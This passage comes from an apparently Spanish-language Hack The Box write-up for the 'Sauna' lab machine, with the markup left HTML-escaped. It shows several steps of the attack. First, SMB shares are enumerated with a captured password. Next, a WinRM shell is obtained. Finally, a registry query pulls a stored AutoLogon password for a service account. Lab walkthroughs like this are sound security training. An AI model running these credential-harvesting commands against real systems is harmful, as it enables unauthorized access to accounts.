&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sauna# smbmap -H 10.10.10.175 -u fsmith -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Thestrokes23&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User SMB session established on 10.10.10.175...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP: 10.10.10.175:445	Name: 10.10.10.175                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	InitShutdown
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	lsass
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ntsvcs
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	scerpc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-360-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	epmapper
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-1cc-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	LSM_API_service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	eventlog
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-420-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	atsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-5b0-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	wkssvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-260-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-260-1
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	RpcProxy&lt;span class=&#34;se&#34;&gt;\4&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9670&lt;/span&gt;
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	b75206e9c2133cf5
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	RpcProxy&lt;span class=&#34;se&#34;&gt;\5&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;93&lt;/span&gt;
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	srvsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	spoolss
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-b94-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	netdfs
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	vgauth-service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-250-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ROUTER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-8f4-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-7d4-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PIPE_EVENTROOT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;IMV2SCM EVENT PROVIDER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	W32TIME_ALT
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272457929604436.3680.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	iisipm8edc73b6-375e-4404-816c-f06e9ca4e3d2
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	iislogpipe5ec33ab0-ed89-4506-a437-f8c09f25dfcb
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272481319626253.3316.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272541365899156.5756.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272546170148799.3268.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272548732993844.5392.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272549933510639.4140.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272556670204143.3228.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132272557556503609.1872.DefaultAppDomain.wsmprovhost
	IPC$                                              	READ ONLY	Remote IPC
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:44:49 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:44:49 2020	..
	NETLOGON                                          	READ ONLY	Logon server share 
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:32:39 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:32:39 2020	..
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:29:26 2020	color
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:32:39 2020	IA64
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 17:10:43 2020	W32X86
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 17:10:42 2020	x64
	print$                                            	READ ONLY	Printer Drivers
	RICOH Aficio SP 8300DN PCL &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;                      	NO ACCESS	We cant print money
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:44:49 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:44:49 2020	..
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Wed Jan &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 23:44:49 2020	EGOTISTICAL-BANK.LOCAL
	SYSVOL                                            	READ ONLY	Logon server share 
root@aoiri:~/htb/sauna#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que tiene permisos de solo lectura en &lt;code&gt;IPC$, NETLOGON, print$ y SYSVOL&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;evil-winrm&#34;&gt;EVIL-WINRM&lt;/h2&gt;
&lt;p&gt;Ya que esta abierto el puerto 5985 de winrm utilizamos las credenciales y evilwinrm para obtener una shell y con ello nuestra flag user.txt.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_155426.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---svc_loanmgr&#34;&gt;USER - svc_loanmgr&lt;/h1&gt;
&lt;p&gt;Hacemos una enumeracion para buscar contraseñas utilizando querys en el registro de windows con comandos de PayloadsAlltheThings.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\F&lt;/span&gt;Smith&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; reg query &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;#34;&lt;/span&gt;

HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows NT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;inlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
    CachedLogonsCount    REG_SZ    &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
    PreCreateKnownFolders    REG_SZ    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;A520A1A4-1780-4FF6-BD18-167343C5AF16&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    ReportBootOk    REG_SZ    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;serinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
    scremoveoption    REG_SZ    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8e3982368
    ShutdownFlags    REG_DWORD    0x80000027
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows NT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;inlogon&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;lternateShells
HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows NT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;inlogon&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;PExtensions
HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows NT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;inlogon&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;serDefaults
HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows NT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;inlogon&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;utoLogonChecked
HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows NT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;inlogon&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;olatileUserMgrKey
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\F&lt;/span&gt;Smith&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; 

Encontramos una contraseña del usuario svc_loanmanager:

DefaultUserName    REG_SZ    EGOTISTICALBANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!

Los usuarios registrados en la maquina aparece svc_loanmgr como usuario, pero en el query aparece svc_loanmanager por lo que suponemos que la contraseña pertenece a svc_loanmgr:

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\F&lt;/span&gt;Smith&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; net users

User accounts &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest                    
HSmith                   krbtgt                   svc_loanmgr              
The &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; completed with one or more errors.

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\F&lt;/span&gt;Smith&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
